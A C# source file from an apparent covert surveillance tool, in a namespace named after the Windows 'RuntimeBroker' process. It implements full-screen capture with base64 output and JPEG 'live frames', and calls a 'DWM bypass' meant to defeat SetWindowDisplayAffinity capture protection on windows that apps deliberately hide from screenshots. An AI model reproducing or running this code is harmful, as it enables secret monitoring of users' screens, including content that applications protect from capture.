using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;

namespace RuntimeBroker;

/// <summary>
/// Full-screen capture. DPI-aware so the bitmap matches the physical
/// resolution. After the GDI pass, V2's DWM bypass overlays pixels for
/// SetWindowDisplayAffinity-protected windows (WDA_MONITOR /
/// WDA_EXCLUDEFROMCAPTURE) — user-mode, no driver, no injection.
/// Supports PNG (stills) and JPEG with quality + max-width (live frames).
/// </summary>
internal static class ScreenCapture
{
    public static int CaptureToFile(string outFile, string format = "png", int quality = 80, int maxWidth = 0)
    {
        try
        {
            var bytes = CaptureBytes(format, quality, maxWidth);
            if (bytes == null) return 2;
            File.WriteAllText(outFile, Convert.ToBase64String(bytes));
            return 0;
        }
        catch (Exception ex)
        {
            try { File.WriteAllText(outFile, "ERR: " + ex.Message); } catch { }
            return 1;
        }
    }

    public static byte[]? CaptureBytes(string format = "png", int quality = 80, int maxWidth = 0)
    {
        try
        {
            var rect = PhysicalVirtualScreen();
            if (rect.Width <= 0 || rect.Height <= 0) return null;
            using var bmp = new Bitmap(rect.Width, rect.Height);
            using (var g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(rect.Left, rect.Top, 0, 0, rect.Size);
            }
            // Best-effort bypass for protected windows (black boxes in GDI).
            try { DwmBypassCapture.OverlayProtectedWindows(bmp, rect); } catch { }

            Bitmap work = bmp;
            Bitmap? scaled = null;
            try
            {
                if (maxWidth > 0 && bmp.Width > maxWidth)
                {
                    int w = maxWidth;
                    int h = Math.Max(1, (int)((long)bmp.Height * maxWidth / bmp.Width));
                    scaled = new Bitmap(bmp, new Size(w, h));
                    work = scaled;
                }
                using var ms = new MemoryStream();
                if (string.Equals(format, "jpeg", StringComparison.OrdinalIgnoreCase) ||
                    string.Equals(format, "jpg", StringComparison.OrdinalIgnoreCase))
                {
                    var codec = GetEncoder(ImageFormat.Jpeg);
                    if (codec != null)
                    {
                        var ep = new EncoderParameters(1);
                        ep.Param[0] = new EncoderParameter(
                            System.Drawing.Imaging.Encoder.Quality,
                            Math.Clamp(quality, 1, 100));
                        work.Save(ms, codec, ep);
                        ep.Dispose();
                    }
                    else
                    {
                        work.Save(ms, ImageFormat.Jpeg);
                    }
                }
                else
                {
                    work.Save(ms, ImageFormat.Png);
                }
                return ms.ToArray();
            }
            finally
            {
                scaled?.Dispose();
            }
        }
        catch
        {
            return null;
        }
    }

    private static ImageCodecInfo? GetEncoder(ImageFormat format)
    {
        try
        {
            return ImageCodecInfo.GetImageEncoders()
                .FirstOrDefault(c => c.FormatID == format.Guid);
        }
        catch { return null; }
    }

    private static Rectangle PhysicalVirtualScreen()
    {
        try { SetProcessDPIAware(); } catch { }
        return new Rectangle(
            GetSystemMetrics(SM_XVIRTUALSCREEN),
            GetSystemMetrics(SM_YVIRTUALSCREEN),
            GetSystemMetrics(SM_CXVIRTUALSCREEN),
            GetSystemMetrics(SM_CYVIRTUALSCREEN));
    }

    private const int SM_XVIRTUALSCREEN = 76;
    private const int SM_YVIRTUALSCREEN = 77;
    private const int SM_CXVIRTUALSCREEN = 78;
    private const int SM_CYVIRTUALSCREEN = 79;

    [DllImport("user32.dll")]
    private static extern int GetSystemMetrics(int nIndex);

    [DllImport("user32.dll")]
    private static extern bool SetProcessDPIAware();
}
